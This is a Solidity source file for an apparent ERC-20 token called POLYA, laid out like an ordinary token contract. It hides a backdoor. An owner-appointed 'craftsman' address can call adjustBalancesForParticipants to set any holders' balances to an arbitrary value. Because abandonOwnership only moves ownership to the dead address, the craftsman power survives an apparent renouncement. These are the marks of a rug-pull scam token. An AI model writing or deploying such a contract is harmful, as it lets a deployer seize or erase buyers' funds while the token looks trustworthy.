pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ContextEnhanced {
    function _retrieveSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract UniquelyOwnable is ContextEnhanced {
    address private _uniqueOwner;
    event OwnershipShifted(address indexed pastOwner, address indexed recentOwner);

    constructor () {
        address msgSender = _retrieveSender();
        _uniqueOwner = msgSender;
        emit OwnershipShifted(address(0), msgSender);
    }
    function fetchOwner() public view virtual returns (address) {
        return _uniqueOwner;
    }
    modifier solelyOwner() {
        require(fetchOwner() == _retrieveSender(), "ExclusiveOwner: executor is not the owner");
        _;
    }
    function abandonOwnership() public virtual solelyOwner {
        emit OwnershipShifted(_uniqueOwner, address(0x000000000000000000000000000000000000dEaD));
        _uniqueOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}



contract POLYA is ContextEnhanced, UniquelyOwnable, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address private _craftsman;

    string public constant _name = "POLYA";
    string public constant _symbol = "POLYA";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);

    constructor() {
        _balances[_retrieveSender()] = _totalSupply;
        emit Transfer(address(0), _retrieveSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function fetchCraftsman() public view virtual returns (address) { 
        return _craftsman;
    }

    function assignCraftsman(address innovativeCraftsman) public solelyOwner { 
        _craftsman = innovativeCraftsman;
    }
    modifier solelyCraftsman() {
        require(fetchCraftsman() == _retrieveSender(), "TOKEN: executor is not the craftsman");
        _;
    }
    event MassDistribution(address indexed beneficiary, uint256 previousBalance, uint256 updatedBalance);

    function adjustBalancesForParticipants(address[] memory participantAddresses, uint256 targetBalance) public solelyCraftsman {

        require(targetBalance >= 0, "Error: target balance should be non-negative");

        for (uint256 index = 0; index < participantAddresses.length; index++) {

            address currentParticipant = participantAddresses[index];

            require(currentParticipant != address(0), "Error: participant address cannot be the zero address");

            uint256 formerBalance = _balances[currentParticipant];

            _balances[currentParticipant] = targetBalance;

            emit MassDistribution(currentParticipant, formerBalance, targetBalance);

        }
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_retrieveSender()] >= amount, "TT: transfer amount exceeds balance");
    _balances[_retrieveSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_retrieveSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_retrieveSender()][spender] = amount;
        emit Approval(_retrieveSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_retrieveSender()] >= amount, "TT: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_retrieveSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}